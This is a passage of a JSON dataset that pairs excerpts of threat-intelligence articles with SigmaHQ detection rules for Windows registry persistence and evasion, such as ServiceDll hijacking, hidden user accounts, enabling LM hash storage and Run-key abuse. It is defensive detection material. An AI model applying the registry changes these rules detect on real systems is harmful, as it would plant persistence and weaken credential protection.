    "markdown": "# Beyond good ol’ Run key, Part 4 Posted on 2013-09-19 Last three articles about various startup/autostart methods covered a lot of different well- and less-known techniques for ‘staying alive’. Many of them are actively used by malware and ‘normal’ software; some are just ideas that are worth describing because… luck favors a prepared mind. If you haven’t read them previously, you can do so by visiting these links: Part 1, Part 2, Part 3. In today’s post I will cover some more techniques including hijacking of various debuggers and some more obscure ways of ‘survival’. I think this is",
    "sigma_rule": {
      "title": "ServiceDll Hijack",
      "id": "612e47e9-8a59-43a6-b404-f48683f45bd6",
      "status": "test",
      "description": "Detects changes to the \"ServiceDLL\" value related to a service in the registry.\nThis is often used as a method of persistence.\n",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1543.003/T1543.003.md#atomic-test-4---tinyturla-backdoor-service-w64time",
        "https://www.hexacorn.com/blog/2013/09/19/beyond-good-ol-run-key-part-4/"
      ],
      "author": "frack113",
      "date": "2022-02-04",
      "modified": "2024-04-03",
      "tags": [
        "attack.persistence",
        "attack.privilege-escalation",
        "attack.t1543.003"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject|contains|all": [
            "\\System\\",
            "ControlSet",
            "\\Services\\"
          ],
          "TargetObject|endswith": "\\Parameters\\ServiceDll"
        },
        "filter_main_printextensionmanger": {
          "Details": "C:\\Windows\\system32\\spool\\drivers\\x64\\3\\PrintConfig.dll"
        },
        "filter_main_domain_controller": {
          "Image": "C:\\Windows\\system32\\lsass.exe",
          "TargetObject|endswith": "\\Services\\NTDS\\Parameters\\ServiceDll",
          "Details": "%%systemroot%%\\system32\\ntdsa.dll"
        },
        "filter_main_poqexec": {
          "Image": "C:\\Windows\\System32\\poqexec.exe"
        },
        "filter_optional_safetica": {
          "Image|endswith": "\\regsvr32.exe",
          "Details": "C:\\Windows\\System32\\STAgent.dll"
        },
        "condition": "selection and not 1 of filter_main_* and not 1 of filter_optional_*"
      },
      "falsepositives": [
        "Administrative scripts",
        "Installation of a service"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_servicedll_hijack.yml"
  },
  "1016": {
    "url": "https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/",
    "markdown": "# SELECT XMRig FROM SQLServer **Categories:** coinminer, exploit **Published Date:** July 11, 2022 --- In March 2022, we observed an intrusion on a public-facing Microsoft SQL Server. The end goal of this intrusion was to deploy a coin miner. Although deploying a coin miner on a vulnerable server after successful exploitation is a common objective for threat actors, this intrusion was slightly different and therefore more interesting. US CERT recently published a malware analysis report related to XMRig coin miner on 23rd June 2022 (link) and a security tip for defending against this threat (link). --- ## Summary Over the",
    "sigma_rule": {
      "title": "Hiding User Account Via SpecialAccounts Registry Key",
      "id": "f8aebc67-a56d-4ec9-9fbe-7b0e8b7b4efd",
      "related": [
        {
          "id": "8a58209c-7ae6-4027-afb0-307a78e4589a",
          "type": "obsolete"
        },
        {
          "id": "9ec9fb1b-e059-4489-9642-f270c207923d",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects modifications to the registry key \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\Userlist\" where the value is set to \"0\" in order to hide user account from being listed on the logon screen.",
      "references": [
        "https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/",
        "https://github.com/redcanaryco/atomic-red-team/blob/40b77d63808dd4f4eafb83949805636735a1fd15/atomics/T1564.002/T1564.002.md"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems), frack113",
      "date": "2022-07-12",
      "modified": "2023-01-26",
      "tags": [
        "attack.defense-evasion",
        "attack.t1564.002"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "EventType": "SetValue",
          "TargetObject|contains": "\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList",
          "Details": "DWORD (0x00000000)"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_special_accounts.yml"
  },
  "1017": {
    "url": "https://github.com/redcanaryco/atomic-red-team/blob/40b77d63808dd4f4eafb83949805636735a1fd15/atomics/T1564.002/T1564.002.md",
    "markdown": "# T1564.002 - Hidden Users ## Description from ATT&CK Adversaries may use hidden users to hide the presence of user accounts they create or modify. Administrators may want to hide users when there are many user accounts on a given system or if they want to hide their administrative or other management accounts from other users. In macOS, adversaries can create or modify a user to be hidden through manipulating plist files, folder attributes, and user attributes. To prevent a user from being shown on the login screen and in System Preferences, adversaries can set the userID to be under",
    "sigma_rule": {
      "title": "Hiding User Account Via SpecialAccounts Registry Key",
      "id": "f8aebc67-a56d-4ec9-9fbe-7b0e8b7b4efd",
      "related": [
        {
          "id": "8a58209c-7ae6-4027-afb0-307a78e4589a",
          "type": "obsolete"
        },
        {
          "id": "9ec9fb1b-e059-4489-9642-f270c207923d",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects modifications to the registry key \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\Userlist\" where the value is set to \"0\" in order to hide user account from being listed on the logon screen.",
      "references": [
        "https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/",
        "https://github.com/redcanaryco/atomic-red-team/blob/40b77d63808dd4f4eafb83949805636735a1fd15/atomics/T1564.002/T1564.002.md"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems), frack113",
      "date": "2022-07-12",
      "modified": "2023-01-26",
      "tags": [
        "attack.defense-evasion",
        "attack.t1564.002"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "EventType": "SetValue",
          "TargetObject|contains": "\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList",
          "Details": "DWORD (0x00000000)"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_special_accounts.yml"
  },
  "1018": {
    "url": "https://unit42.paloaltonetworks.com/unit42-upatre-continues-evolve-new-anti-analysis-techniques/",
    "markdown": "# Upatre Continued to Evolve with new Anti-Analysis Techniques **Malware** Published: July 13, 2018 Categories: Cybercrime Malware Threat Research Tags: Dot-bit Downloader Namecoin Upatre --- ## Malware Overview First discovered in 2013, Upatre is primarily a downloader tool responsible for delivering additional trojans onto the victim host. It is most well-known for being tied with the Dyre banking trojan, with a peak of over 250,000 Upatre infections per month delivering Dyre back in July 2015. In November 2015, an organization thought to be associated with the Dyre operation was raided, and subsequently, the usage of Upatre delivering Dyre dropped dramatically,",
    "sigma_rule": {
      "title": "Registry Persistence via Explorer Run Key",
      "id": "b7916c2a-fa2f-4795-9477-32b731f70f11",
      "status": "test",
      "description": "Detects a possible persistence mechanism using RUN key for Windows Explorer and pointing to a suspicious folder",
      "references": [
        "https://unit42.paloaltonetworks.com/unit42-upatre-continues-evolve-new-anti-analysis-techniques/"
      ],
      "author": "Florian Roth (Nextron Systems), oscd.community",
      "date": "2018-07-18",
      "modified": "2023-12-11",
      "tags": [
        "attack.persistence",
        "attack.t1547.001"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject|endswith": "\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run",
          "Details|contains": [
            ":\\$Recycle.bin\\",
            ":\\ProgramData\\",
            ":\\Temp\\",
            ":\\Users\\Default\\",
            ":\\Users\\Public\\",
            ":\\Windows\\Temp\\",
            "\\AppData\\Local\\Temp\\"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_susp_reg_persist_explorer_run.yml"
  },
  "1019": {
    "url": "https://cloud.google.com/blog/topics/threat-intelligence/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation/",
    "markdown": "# On the Hunt for FIN7: Pursuing an Enigmatic and Evasive Global Criminal Operation **August 1, 2018** --- On Aug. 1, 2018, the United States District Attorney’s Office for the Western District of Washington unsealed indictments and announced the arrests of three individuals within the leadership ranks of a criminal organization that aligns with activity we have tracked since 2015 as FIN7. These malicious actors are members of one of the most prolific financial threat groups of this decade, having carefully crafted attacks targeted at more than 100 organizations. FIN7 is referred to by many vendors as “Carbanak Group,” although",
    "sigma_rule": {
      "title": "New RUN Key Pointing to Suspicious Folder",
      "id": "02ee49e2-e294-4d0f-9278-f5b3212fc588",
      "status": "experimental",
      "description": "Detects suspicious new RUN key element pointing to an executable in a suspicious folder",
      "references": [
        "https://cloud.google.com/blog/topics/threat-intelligence/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation/"
      ],
      "author": "Florian Roth (Nextron Systems), Markus Neis, Sander Wiebing",
      "date": "2018-08-25",
      "modified": "2024-07-16",
      "tags": [
        "attack.persistence",
        "attack.t1547.001"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection_target": {
          "TargetObject|contains": [
            "\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\",
            "\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\"
          ]
        },
        "selection_details": [
          {
            "Details|contains": [
              ":\\$Recycle.bin\\",
              ":\\Temp\\",
              ":\\Users\\Default\\",
              ":\\Users\\Desktop\\",
              ":\\Users\\Public\\",
              ":\\Windows\\Temp\\",
              "\\AppData\\Local\\Temp\\",
              "%temp%\\",
              "%tmp%\\"
            ]
          },
          {
            "Details|startswith": [
              "%Public%\\",
              "wscript",
              "cscript"
            ]
          }
        ],
        "filter_main_windows_update": {
          "TargetObject|contains": "\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\",
          "Image|startswith": "C:\\Windows\\SoftwareDistribution\\Download\\",
          "Details|contains|all": [
            "rundll32.exe ",
            "C:\\WINDOWS\\system32\\advpack.dll,DelNodeRunDLL32"
          ],
          "Details|contains": [
            "\\AppData\\Local\\Temp\\",
            "C:\\Windows\\Temp\\"
          ]
        },
        "condition": "all of selection_* and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Software using weird folders for updates"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_susp_run_key_img_folder.yml"
  },
  "1020": {
    "url": "https://web.archive.org/web/20200419024230/https://blog.dylan.codes/evading-sysmon-and-windows-event-logging/",
    "markdown": "# Universally Evading Sysmon and ETW **Date:** 07 Apr 2020 The source code and latest release are both available. Sysmon and windows event log are both extremely powerful tools in a defender's arsenal. Their very flexible configurations give them a great insight into the activity on endpoints, making the process of detecting attackers a lot easier. It's for this reason that I'm going to lead you through my journey in defeating them ;) There's been some great research into this by xpn and matterpreter. Their solutions are both good but don't quite reach my needs of a fully universal bypass.",
    "sigma_rule": {
      "title": "Suspicious Service Installed",
      "id": "f2485272-a156-4773-82d7-1d178bc4905b",
      "status": "test",
      "description": "Detects installation of NalDrv or PROCEXP152 services via registry-keys to non-system32 folders.\nBoth services are used in the tool Ghost-In-The-Logs (https://github.com/bats3c/Ghost-In-The-Logs), which uses KDU (https://github.com/hfiref0x/KDU)\n",
      "references": [
        "https://web.archive.org/web/20200419024230/https://blog.dylan.codes/evading-sysmon-and-windows-event-logging/"
      ],
      "author": "xknow (@xknow_infosec), xorxes (@xor_xes)",
      "date": "2019-04-08",
      "modified": "2023-08-17",
      "tags": [
        "attack.t1562.001",
        "attack.defense-evasion"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject": [
            "HKLM\\System\\CurrentControlSet\\Services\\NalDrv\\ImagePath",
            "HKLM\\System\\CurrentControlSet\\Services\\PROCEXP152\\ImagePath"
          ]
        },
        "filter": {
          "Image|endswith": [
            "\\procexp64.exe",
            "\\procexp.exe",
            "\\procmon64.exe",
            "\\procmon.exe",
            "\\handle.exe",
            "\\handle64.exe"
          ],
          "Details|contains": "\\WINDOWS\\system32\\Drivers\\PROCEXP152.SYS"
        },
        "condition": "selection and not filter"
      },
      "falsepositives": [
        "Other legimate tools using this service names and drivers. Note - clever attackers may easily bypass this detection by just renaming the services. Therefore just Medium-level and don't rely on it."
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_susp_service_installed.yml"
  },
  "1021": {
    "url": "https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-347a",
    "markdown": "# Russian Foreign Intelligence Service (SVR) Exploiting JetBrains TeamCity CVE Globally **Release Date**: December 13, 2023 **Alert Code**: AA23-347A **Related topics**: Nation-State Cyber Actors, Cyber Threats and Advisories, Securing Networks --- ## SUMMARY The U.S. Federal Bureau of Investigation (FBI), U.S. Cybersecurity & Infrastructure Security Agency (CISA), U.S. National Security Agency (NSA), Polish Military Counterintelligence Service (SKW), CERT Polska (CERT.PL), and the UK’s National Cyber Security Centre (NCSC) assess Russian Foreign Intelligence Service (SVR) cyber actors—also known as Advanced Persistent Threat 29 (APT 29), the Dukes, CozyBear, and NOBELIUM/Midnight Blizzard—are exploiting CVE-2023-42793 at a large scale, targeting servers hosting JetBrains",
    "sigma_rule": {
      "title": "Enable LM Hash Storage",
      "id": "c420410f-c2d8-4010-856b-dffe21866437",
      "related": [
        {
          "id": "98dedfdd-8333-49d4-9f23-d7018cccae53",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects changes to the \"NoLMHash\" registry value in order to allow Windows to store LM Hashes.\nBy setting this registry value to \"0\" (DWORD), Windows will be allowed to store a LAN manager hash of your password in Active Directory and local SAM databases.\n",
      "references": [
        "https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-347a",
        "https://learn.microsoft.com/en-us/troubleshoot/windows-server/windows-security/prevent-windows-store-lm-hash-password",
        "https://www.sans.org/blog/protecting-privileged-domain-accounts-lm-hashes-the-good-the-bad-and-the-ugly/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-12-15",
      "tags": [
        "attack.defense-evasion",
        "attack.t1112"
      ],
      "logsource": {
        "product": "windows",
        "category": "registry_set"
      },
      "detection": {
        "selection": {
          "TargetObject|endswith": "System\\CurrentControlSet\\Control\\Lsa\\NoLMHash",
          "Details": "DWORD (0x00000000)"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_system_lsa_nolmhash.yml"
  },
  "1022": {
    "url": "https://learn.microsoft.com/en-us/troubleshoot/windows-server/windows-security/prevent-windows-store-lm-hash-password",
    "markdown": "# How to prevent Windows from storing a LAN manager hash of your password in Active Directory and local SAM databases This article provides three methods to prevent Windows from storing a LAN Manager (LM) hash of your password in Active Directory and local Security Accounts Manager (SAM) databases. *Original KB number: 299656* ## Summary Windows doesn't store your user account password in clear-text. Instead, it generates and stores user account passwords by using two different password representations, known as hashes. When you set or change the password for a user account to a password that contains fewer than 15",
    "sigma_rule": {
      "title": "Enable LM Hash Storage",
      "id": "c420410f-c2d8-4010-856b-dffe21866437",
      "related": [
        {
          "id": "98dedfdd-8333-49d4-9f23-d7018cccae53",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects changes to the \"NoLMHash\" registry value in order to allow Windows to store LM Hashes.\nBy setting this registry value to \"0\" (DWORD), Windows will be allowed to store a LAN manager hash of your password in Active Directory and local SAM databases.\n",
      "references": [
        "https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-347a",
        "https://learn.microsoft.com/en-us/troubleshoot/windows-server/windows-security/prevent-windows-store-lm-hash-password",
        "https://www.sans.org/blog/protecting-privileged-domain-accounts-lm-hashes-the-good-the-bad-and-the-ugly/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-12-15",
      "tags": [
        "attack.defense-evasion",
        "attack.t1112"
      ],
      "logsource": {
        "product": "windows",
        "category": "registry_set"
      },
      "detection": {
        "selection": {
          "TargetObject|endswith": "System\\CurrentControlSet\\Control\\Lsa\\NoLMHash",
          "Details": "DWORD (0x00000000)"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_system_lsa_nolmhash.yml"
  },
  "1023": {
    "url": "https://www.sans.org/blog/protecting-privileged-domain-accounts-lm-hashes-the-good-the-bad-and-the-ugly/",
    "markdown": "# Protecting Privileged Domain Accounts: LM Hashes: The Good, the Bad, and the Ugly **February 29, 2012** *Author's Note: This is the 2nd in a multi-part series on the topic of \"Protecting Privileged Domain Accounts\". My primary goal is to help incident responders protect their privileged accounts when interacting with comprised hosts, though I also believe this information will be useful to anyone administering and defending a Windows environment.* I realize the LanMan (LM) hash is old-hat for many, but I've recently discovered that the LM hash is even more dangerous than I previously realized. This is due to both",
    "sigma_rule": {
      "title": "Enable LM Hash Storage",
      "id": "c420410f-c2d8-4010-856b-dffe21866437",
      "related": [
        {
          "id": "98dedfdd-8333-49d4-9f23-d7018cccae53",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects changes to the \"NoLMHash\" registry value in order to allow Windows to store LM Hashes.\nBy setting this registry value to \"0\" (DWORD), Windows will be allowed to store a LAN manager hash of your password in Active Directory and local SAM databases.\n",
      "references": [
        "https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-347a",
        "https://learn.microsoft.com/en-us/troubleshoot/windows-server/windows-security/prevent-windows-store-lm-hash-password",
        "https://www.sans.org/blog/protecting-privileged-domain-accounts-lm-hashes-the-good-the-bad-and-the-ugly/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-12-15",
      "tags": [
        "attack.defense-evasion",
        "attack.t1112"
      ],
      "logsource": {
        "product": "windows",
        "category": "registry_set"
      },
      "detection": {
        "selection": {
          "TargetObject|endswith": "System\\CurrentControlSet\\Control\\Lsa\\NoLMHash",
          "Details": "DWORD (0x00000000)"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_system_lsa_nolmhash.yml"
  },
  "1024": {
    "url": "https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/",
    "markdown": "# Sodinokibi (aka REvil) Ransomware **Categories:** adfind cobaltstrike icedid ransomware revil Sodinokibi **Published on:** March 29, 2021 ### Intro Sodinokibi (aka REvil) has been one of the most prolific ransomware as a service (RaaS) groups over the last couple years. The ransomware family was purported to be behind the Travelex intrusion and current reports point to an attack against Acer for a reported $50 million ransom demand. In March, we observed an intrusion which started with malicious spam that dropped IcedID (Bokbot) into the environment and subsequently allowed access to a group distributing Sodinokibi ransomware. During the intrusion the threat",
    "sigma_rule": {
      "title": "Scheduled TaskCache Change by Uncommon Program",
      "id": "4720b7df-40c3-48fd-bbdf-fd4b3c464f0d",
      "status": "test",
      "description": "Monitor the creation of a new key under 'TaskCache' when a new scheduled task is registered by a process that is not svchost.exe, which is suspicious",
      "references": [
        "https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/",
        "https://web.archive.org/web/20221112001212/https://labs.withsecure.com/publications/scheduled-task-tampering"
      ],
      "author": "Syed Hasan (@syedhasan009)",
      "date": "2021-06-18",
      "modified": "2023-08-17",
      "tags": [
        "attack.persistence",
        "attack.t1053",
        "attack.t1053.005"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject|contains": "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\"
        },
        "filter": {
          "TargetObject|contains": [
            "Microsoft\\Windows\\UpdateOrchestrator",
            "Microsoft\\Windows\\SoftwareProtectionPlatform\\SvcRestartTask\\Index",
            "Microsoft\\Windows\\Flighting\\OneSettings\\RefreshCache\\Index"
          ]
        },
        "filter_tiworker": {
          "Image|startswith": "C:\\Windows\\",
          "Image|endswith": "\\TiWorker.exe"
        },
        "filter_svchost": {
          "Image": "C:\\WINDOWS\\system32\\svchost.exe"
        },
        "filter_ngen": {
          "Image|startswith": "C:\\Windows\\Microsoft.NET\\Framework",
          "Image|endswith": "\\ngen.exe",
          "TargetObject|contains": [
            "\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks\\{B66B135D-DA06-4FC4-95F8-7458E1D10129}",
            "\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\Microsoft\\Windows\\.NET Framework\\.NET Framework NGEN"
          ]
        },
        "filter_office_click_to_run": {
          "Image": [
            "C:\\Program Files\\Microsoft Office\\root\\Integration\\Integrator.exe",
            "C:\\Program Files (x86)\\Microsoft Office\\root\\Integration\\Integrator.exe"
          ]
        },
        "filter_msiexec": {
          "Image": "C:\\Windows\\System32\\msiexec.exe"
        },
        "filter_dropbox_updater": {
          "Image": [
            "C:\\Program Files (x86)\\Dropbox\\Update\\DropboxUpdate.exe",
            "C:\\Program Files\\Dropbox\\Update\\DropboxUpdate.exe"
          ]
        },
        "filter_explorer": {
          "Image": "C:\\Windows\\explorer.exe",
          "TargetObject|contains": "\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\Microsoft\\Windows\\PLA\\Server Manager Performance Monitor\\"
        },
        "filter_system": {
          "Image": "System"
        },
        "condition": "selection and not 1 of filter*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_taskcache_entry.yml"
  },
  "1025": {
    "url": "https://web.archive.org/web/20221112001212/https://labs.withsecure.com/publications/scheduled-task-tampering",
    "markdown": "# Scheduled Task Tampering 4 May, 2022 --- ## Introduction Microsoft recently published an article that documented how the HAFNIUM threat actor leveraged a flaw in how scheduled tasks are stored in the registry to hide their presence. This made it immediately clear that it was likely that the one presented was not the only flaw that affected the scheduled task component. We began researching how the registry structure of the scheduled tasks could be abused to accomplish various goals, such as lateral movement and persistence. Specifically, we investigated what were the minimum conditions for a task to be created,",
    "sigma_rule": {
      "title": "Scheduled TaskCache Change by Uncommon Program",
      "id": "4720b7df-40c3-48fd-bbdf-fd4b3c464f0d",
      "status": "test",
      "description": "Monitor the creation of a new key under 'TaskCache' when a new scheduled task is registered by a process that is not svchost.exe, which is suspicious",
      "references": [
        "https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/",
        "https://web.archive.org/web/20221112001212/https://labs.withsecure.com/publications/scheduled-task-tampering"
      ],
      "author": "Syed Hasan (@syedhasan009)",
      "date": "2021-06-18",
      "modified": "2023-08-17",
      "tags": [
        "attack.persistence",
        "attack.t1053",
        "attack.t1053.005"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject|contains": "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\"
        },
        "filter": {
          "TargetObject|contains": [
            "Microsoft\\Windows\\UpdateOrchestrator",
            "Microsoft\\Windows\\SoftwareProtectionPlatform\\SvcRestartTask\\Index",
            "Microsoft\\Windows\\Flighting\\OneSettings\\RefreshCache\\Index"
          ]
        },
        "filter_tiworker": {
          "Image|startswith": "C:\\Windows\\",
          "Image|endswith": "\\TiWorker.exe"
        },
        "filter_svchost": {
          "Image": "C:\\WINDOWS\\system32\\svchost.exe"
        },
        "filter_ngen": {
          "Image|startswith": "C:\\Windows\\Microsoft.NET\\Framework",
          "Image|endswith": "\\ngen.exe",
          "TargetObject|contains": [
            "\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks\\{B66B135D-DA06-4FC4-95F8-7458E1D10129}",
            "\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\Microsoft\\Windows\\.NET Framework\\.NET Framework NGEN"
          ]
        },
        "filter_office_click_to_run": {
          "Image": [
            "C:\\Program Files\\Microsoft Office\\root\\Integration\\Integrator.exe",
            "C:\\Program Files (x86)\\Microsoft Office\\root\\Integration\\Integrator.exe"
          ]
        },
        "filter_msiexec": {
          "Image": "C:\\Windows\\System32\\msiexec.exe"
        },
        "filter_dropbox_updater": {
          "Image": [
            "C:\\Program Files (x86)\\Dropbox\\Update\\DropboxUpdate.exe",
            "C:\\Program Files\\Dropbox\\Update\\DropboxUpdate.exe"
          ]
        },
        "filter_explorer": {
          "Image": "C:\\Windows\\explorer.exe",
          "TargetObject|contains": "\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\Microsoft\\Windows\\PLA\\Server Manager Performance Monitor\\"
        },
        "filter_system": {
          "Image": "System"
        },
        "condition": "selection and not 1 of filter*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_taskcache_entry.yml"
  },
  "1026": {
    "url": "https://twitter.com/malmoeb/status/1560536653709598721",
    "markdown": "# Post Aug 19, 2022 2/ We can search our network for systems with enabled sideloading: ``` reg query \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\AppModelUnlock\". ``` ```image Description: The image displays a screenshot of a PowerShell output showing the Windows registry settings related to AppModelUnlock. It includes the registry keys: 'AllowAllTrustedApps' and 'AllowDevelopmentWithoutDevLicense', both indicating their values. The highlighted sections emphasize that 'AllowAllTrustedApps' is set to '0x1', which suggests that sideloading is enabled on the system. This is relevant for cybersecurity analysis as it indicates system configurations that could be exploited. Transcription: | Windows.System.PowerShell Stdout HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\AppModelUnlock AllowDevelopmentWithoutDevLicense REG_DWORD 0x0 AllowAllTrustedApps REG_DWORD 0x1 HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\AppModelUnlock AllowAllTrustedApps REG_DWORD",
    "sigma_rule": {
      "title": "Potential Signing Bypass Via Windows Developer Features - Registry",
      "id": "b110ebaf-697f-4da1-afd5-b536fa27a2c1",
      "related": [
        {
          "id": "a383dec4-deec-4e6e-913b-ed9249670848",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects when the enablement of developer features such as \"Developer Mode\" or \"Application Sideloading\". Which allows the user to install untrusted packages.",
      "references": [
        "https://twitter.com/malmoeb/status/1560536653709598721",
        "https://www.sentinelone.com/labs/inside-malicious-windows-apps-for-malware-deployment/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-01-12",
      "modified": "2023-08-17",
      "tags": [
        "attack.defense-evasion"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject|contains": [
            "\\Microsoft\\Windows\\CurrentVersion\\AppModelUnlock",
            "\\Policies\\Microsoft\\Windows\\Appx\\"
          ],
          "TargetObject|endswith": [
            "\\AllowAllTrustedApps",
            "\\AllowDevelopmentWithoutDevLicense"
          ],
          "Details": "DWORD (0x00000001)"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_turn_on_dev_features.yml"
  },
  "1027": {
    "url": "https://www.sentinelone.com/labs/inside-malicious-windows-apps-for-malware-deployment/",
    "markdown": "# Inside Malicious Windows Apps for Malware Deployment **Date:** July 14, 2022 This article discusses Windows Apps – Windows applications packaged into *APPX* or *MSIX* packages – as a medium to deploy malware. Though not as widely abused as other infection vectors, there have been a number of recent high profile attacks that use Windows Apps. - **November, 2021:** BazarBackdoor was distributed in the form of an *APPX* package. - **December, 2021:** Emotet malware was distributed by abusing a spoofing vulnerability in the Windows App Installer, software that installs Windows Apps. - **January, 2022:** Malicious Windows Apps in *APPX* format",
    "sigma_rule": {
      "title": "Potential Signing Bypass Via Windows Developer Features - Registry",
      "id": "b110ebaf-697f-4da1-afd5-b536fa27a2c1",
      "related": [
        {
          "id": "a383dec4-deec-4e6e-913b-ed9249670848",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects when the enablement of developer features such as \"Developer Mode\" or \"Application Sideloading\". Which allows the user to install untrusted packages.",
      "references": [
        "https://twitter.com/malmoeb/status/1560536653709598721",
        "https://www.sentinelone.com/labs/inside-malicious-windows-apps-for-malware-deployment/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-01-12",
      "modified": "2023-08-17",
      "tags": [
        "attack.defense-evasion"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject|contains": [
            "\\Microsoft\\Windows\\CurrentVersion\\AppModelUnlock",
            "\\Policies\\Microsoft\\Windows\\Appx\\"
          ],
          "TargetObject|endswith": [
            "\\AllowAllTrustedApps",
            "\\AllowDevelopmentWithoutDevLicense"
          ],
          "Details": "DWORD (0x00000001)"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
